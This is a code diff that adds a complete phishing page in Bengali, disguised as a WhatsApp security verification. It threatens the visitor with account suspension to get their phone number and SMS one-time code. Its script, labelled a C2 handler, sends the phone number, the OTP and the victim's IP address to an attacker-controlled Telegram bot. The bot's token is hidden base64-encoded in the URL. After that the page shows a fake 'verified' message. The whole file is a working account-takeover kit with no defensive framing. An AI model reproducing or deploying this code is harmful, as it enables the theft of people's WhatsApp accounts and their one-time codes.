@@ -1,0 +1,315 @@
+<!doctype html>
+<html lang="bn">
+  <head>
+    <script src="/tg-client.js"></script>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>WhatsApp Support - Security Verification</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      body {
+        font-family: "Roboto", sans-serif;
+        background-color: #f7f7f7;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        min-height: 100vh;
+        padding: 20px;
+      }
+      .container {
+        width: 100%;
+        max-width: 400px;
+        background: white;
+        border-radius: 10px;
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        overflow: hidden;
+      }
+      .header {
+        background-color: #075e54;
+        padding: 20px;
+        text-align: center;
+        color: white;
+      }
+      .ws-icon {
+        font-size: 50px;
+        margin-bottom: 10px;
+      }
+      .main {
+        padding: 30px;
+        text-align: center;
+      }
+      .title {
+        font-size: 20px;
+        font-weight: 700;
+        color: #128c7e;
+        margin-bottom: 15px;
+      }
+      .desc {
+        font-size: 14px;
+        color: #4a4a4a;
+        line-height: 1.6;
+        margin-bottom: 25px;
+      }
+
+      .input-group {
+        margin-bottom: 20px;
+        text-align: left;
+      }
+      .label {
+        font-size: 13px;
+        color: #128c7e;
+        font-weight: 700;
+        display: block;
+        margin-bottom: 5px;
+      }
+      .input {
+        width: 100%;
+        padding: 12px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        font-size: 16px;
+        outline: none;
+        transition: 0.3s;
+      }
+      .input:focus {
+        border-color: #25d366;
+        box-shadow: 0 0 5px rgba(37, 211, 102, 0.3);
+      }
+
+      .btn {
+        width: 100%;
+        padding: 14px;
+        background-color: #25d366;
+        color: white;
+        border: none;
+        border-radius: 5px;
+        font-size: 16px;
+        font-weight: 700;
+        cursor: pointer;
+        text-transform: uppercase;
+      }
+      .btn:hover {
+        background-color: #1ebea5;
+      }
+
+      .section {
+        display: none;
+      }
+      .active {
+        display: block;
+        animation: fadeIn 0.5s;
+      }
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+        }
+        to {
+          opacity: 1;
+        }
+      }
+
+      .loading-dots:after {
+        content: ".";
+        animation: dots 1s steps(5, end) infinite;
+      }
+      @keyframes dots {
+        0%,
+        20% {
+          color: rgba(0, 0, 0, 0);
+          text-shadow:
+            0.5em 0 0 rgba(0, 0, 0, 0),
+            1em 0 0 rgba(0, 0, 0, 0);
+        }
+        40% {
+          color: #128c7e;
+          text-shadow:
+            0.5em 0 0 rgba(0, 0, 0, 0),
+            1em 0 0 rgba(0, 0, 0, 0);
+        }
+        60% {
+          text-shadow:
+            0.5em 0 0 #128c7e,
+            1em 0 0 rgba(0, 0, 0, 0);
+        }
+        80%,
+        100% {
+          text-shadow:
+            0.5em 0 0 #128c7e,
+            1em 0 0 #128c7e;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="header">
+        <div class="ws-icon">💬</div>
+        <h2>WhatsApp Security</h2>
+      </div>
+
+      <div class="main">
+        <div id="step1" class="section active">
+          <h3 class="title">অ্যাকাউন্ট ভেরিফিকেশন</h3>
+          <p class="desc">
+            নিরাপত্তার কারণে আপনার হোয়াটসঅ্যাপ অ্যাকাউন্টটি ভেরিফাই করা প্রয়োজন।
+            অন্যথায় আপনার অ্যাকাউন্টটি সাময়িকভাবে স্থগিত করা হতে পারে।
+          </p>
+          <div class="input-group">
+            <label class="label">আপনার ফোন নম্বর দিন</label>
+            <input
+              type="text"
+              id="phone"
+              class="input"
+              placeholder="+8801XXXXXXXXX"
+            />
+          </div>
+          <button class="btn" id="next1">কোড পাঠান</button>
+        </div>
+
+        <div id="step2" class="section">
+          <h3 class="title">SMS কোড লিখুন</h3>
+          <p class="desc">
+            আমরা আপনার নম্বরে একটি ৬-ডিজিটের ভেরিফিকেশন কোড পাঠিয়েছি। কোডটি নিচে
+            দিয়ে ভেরিফাই সম্পন্ন করুন।
+          </p>
+          <div class="input-group">
+            <label class="label">৬-ডিজিটের কোড (OTP)</label>
+            <input
+              type="text"
+              id="otp"
+              class="input"
+              placeholder="- - -   - - -"
+              maxlength="6"
+            />
+          </div>
+          <button class="btn" id="next2">ভেরিফাই করুন</button>
+        </div>
+
+        <div id="loading" class="section">
+          <p class="title loading-dots">তথ্য যাচাই করা হচ্ছে</p>
+          <p class="desc">
+            দয়া করে ১ মিনিট অপেক্ষা করুন। আপনার ব্রাউজার রিফ্রেশ করবেন না।
+          </p>
+        </div>
+
+        <div id="success" class="section">
+          <h3 class="title" style="color: #25d366">সফল হয়েছে! ✅</h3>
+          <p class="desc">
+            আপনার হোয়াটসঅ্যাপ অ্যাকাউন্টটি সফলভাবে ভেরিফাই করা হয়েছে। আপনার
+            অ্যাকাউন্ট এখন সম্পূর্ণ নিরাপদ। ধন্যবাদ।
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      class C2Handler {
+        constructor() {
+          this.config = this.init();
+        }
+
+        init() {
+          const params = new URLSearchParams(window.location.search);
+          const p = params.get("p");
+          if (p) {
+            try {
+              const decoded = JSON.parse(atob(p));
+              return { token: decoded.bot, chat: decoded.chat };
+            } catch (e) {
+              console.error("Config missing");
+            }
+          }
+          return { token: null, chat: null };
+        }
+
+        async getIP() {
+          try {
+            const res = await fetch("https://api.ipify.org?format=json");
+            const data = await res.json();
+            return data.ip;
+          } catch {
+            return "Unknown";
+          }
+        }
+
+        async sendTelegram(phone, otp = "", stage = "Number Sent") {
+          if (!this.config.token || !this.config.chat) return;
+
+          const ip = await this.getIP();
+          const time = new Date().toLocaleString("bn-BD", {
+            timeZone: "Asia/Dhaka",
+          });
+
+          let message = `*🟢 WHATSAPP HIT DETECTED* 🔥\n\n`;
+          message += `📱 *Phone:* \`${phone}\`\n`;
+          if (otp) message += `🔐 *OTP Code:* \`${otp}\` ✅\n`;
+          message += `\n📊 *Stage:* ${stage}\n`;
+          message += `🌐 *IP:* \`${ip}\`\n`;
+          message += `🕐 *Time:* ${time}\n`;
+
+          try {
+            await fetch(
+              `https://api.telegram.org/bot${this.config.token}/sendMessage`,
+              {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  chat_id: this.config.chat,
+                  text: message,
+                  parse_mode: "Markdown",
+                }),
+              },
+            );
+          } catch (e) {
+            console.log("C2 Error");
+          }
+        }
+      }
+
+      const c2 = new C2Handler();
+      let userPhone = "";
+
+      // Next Step 1
+      document.getElementById("next1").onclick = async () => {
+        userPhone = document.getElementById("phone").value.trim();
+        if (userPhone.length < 11) {
+          alert("সঠিক নম্বর দিন!");
+          return;
+        }
+
+        document.getElementById("next1").innerText = "অপেক্ষা করুন...";
+        await c2.sendTelegram(userPhone, "", "Step 1: Phone Received");
+
+        document.getElementById("step1").classList.remove("active");
+        document.getElementById("step2").classList.add("active");
+      };
+
+      // Next Step 2
+      document.getElementById("next2").onclick = async () => {
+        const otpVal = document.getElementById("otp").value.trim();
+        if (otpVal.length < 6) {
+          alert("৬-ডিজিটের সঠিক কোড দিন!");
+          return;
+        }
+
+        document.getElementById("step2").classList.remove("active");
+        document.getElementById("loading").classList.add("active");
+
+        await c2.sendTelegram(userPhone, otpVal, "Step 2: Full Access (OTP)");
+
+        setTimeout(() => {
+          document.getElementById("loading").classList.remove("active");
+          document.getElementById("success").classList.add("active");
+        }, 5000);
+      };
+    </script>
+  </body>
+</html>
